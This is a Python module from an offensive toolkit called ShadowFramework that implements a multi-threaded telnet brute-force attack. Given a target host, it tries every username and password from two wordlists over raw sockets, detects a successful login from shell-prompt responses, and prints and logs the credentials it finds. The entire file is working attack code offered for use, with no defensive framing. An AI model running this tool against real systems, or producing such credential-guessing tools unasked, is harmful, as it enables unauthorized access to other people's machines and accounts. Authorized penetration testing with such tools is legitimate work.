"""
ShadowFramework — Telnet Bruteforce
Multi-threaded telnet bruteforce using raw sockets (no external dependencies).
"""
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from utils.logger import log_action

console = Console()


class Module:
    MODULE_INFO = {
        'name': 'auxiliary/telnet_bruteforce',
        'description': 'Multi-threaded Telnet bruteforce using raw sockets.',
        'options': {
            'RHOST': 'Target IP address',
            'RPORT': 'Target port [default: 23]',
            'USER_FILE': 'Path to username wordlist [default: wordlists/usernames.txt]',
            'PASS_FILE': 'Path to password wordlist [default: wordlists/passwords.txt]',
            'THREADS': 'Number of concurrent attempts [default: 5]',
            'TIMEOUT': 'Connection timeout in seconds [default: 5]',
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self._found = False
        self._lock = threading.Lock()

    def _recv_until(self, sock, prompts, timeout=5):
        """Receive data until a prompt string is found or timeout."""
        data = b''
        sock.settimeout(timeout)
        end = time.time() + timeout
        while time.time() < end:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                lower = data.lower()
                for p in prompts:
                    if p in lower:
                        return data
            except socket.timeout:
                break
            except Exception:
                break
        return data

    def _attempt_login(self, host, port, user, password, timeout):
        """Attempt a single telnet login."""
        if self._found:
            return None

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))

            # Read banner / initial prompt
            banner = self._recv_until(sock, [b'login:', b'username:', b'user:', b'$', b'#', b'>'], timeout)

            # Send username
            if any(p in banner.lower() for p in [b'login:', b'username:', b'user:']):
                sock.sendall(user.encode() + b'\r\n')
                # Wait for password prompt
                resp = self._recv_until(sock, [b'password:', b'pass:'], timeout)
            else:
                # Some systems skip straight to password or shell
                sock.sendall(user.encode() + b'\r\n')
                resp = self._recv_until(sock, [b'password:', b'pass:', b'$', b'#'], timeout)

            # Send password
            if any(p in resp.lower() for p in [b'password:', b'pass:']):
                sock.sendall(password.encode() + b'\r\n')
                result = self._recv_until(sock, [b'$', b'#', b'>', b'login:', b'incorrect', b'failed', b'denied'], timeout)
            else:
                result = resp

            sock.close()

            lower = result.lower()
            # Check for failure indicators
            fail_indicators = [b'incorrect', b'failed', b'denied', b'invalid', b'bad', b'login:']
            success_indicators = [b'$', b'#', b'>', b'welcome', b'last login', b'connected']

            for indicator in fail_indicators:
                if indicator in lower:
                    return None

            for indicator in success_indicators:
                if indicator in lower:
                    return (user, password)

            return None

        except (socket.timeout, ConnectionRefusedError, OSError):
            return None

    def run(self):
        rhost = self.framework.options.get('RHOST')
        rport = int(self.framework.options.get('RPORT', '23'))
        user_file = self.framework.options.get('USER_FILE', 'wordlists/usernames.txt')
        pass_file = self.framework.options.get('PASS_FILE', 'wordlists/passwords.txt')
        threads = int(self.framework.options.get('THREADS', '5'))
        timeout = int(self.framework.options.get('TIMEOUT', '5'))

        if not rhost:
            console.print("[red][!] RHOST is required.[/red]")
            return

        try:
            with open(user_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError as e:
            console.print(f"[red][!] Wordlist not found: {e}[/red]")
            return

        total = len(usernames) * len(passwords)
        console.print(f"[cyan][*] Telnet bruteforce on {rhost}:{rport}[/cyan]")
        console.print(f"    {len(usernames)} users × {len(passwords)} passwords = {total} attempts ({threads} threads)")
        log_action(f"Telnet bruteforce started on {rhost}:{rport}")

        # Quick connectivity check
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((rhost, rport))
            banner = s.recv(1024)
            s.close()
            console.print(f"    [dim]Banner: {banner[:100]}[/dim]")
        except Exception as e:
            console.print(f"[red][!] Cannot connect to {rhost}:{rport}: {e}[/red]")
            return

        found_creds = None
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[cyan]{task.completed}/{task.total}[/cyan]")) as progress:
            task = progress.add_task("Bruteforcing...", total=total)

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                for user in usernames:
                    for pwd in passwords:
                        if self._found:
                            break
                        f = executor.submit(self._attempt_login, rhost, rport, user, pwd, timeout)
                        futures[f] = (user, pwd)
                    if self._found:
                        break

                for future in as_completed(futures):
                    progress.advance(task)
                    result = future.result()
                    if result and not self._found:
                        with self._lock:
                            self._found = True
                            found_creds = result

        if found_creds:
            user, pwd = found_creds
            console.print(f"\n[bold green][+] SUCCESS! Credentials found: {user}:{pwd}[/bold green]")
            log_action(f"Telnet success on {rhost}: {user}:{pwd}")
        else:
            console.print("[yellow][!] Bruteforce finished. No valid credentials found.[/yellow]")
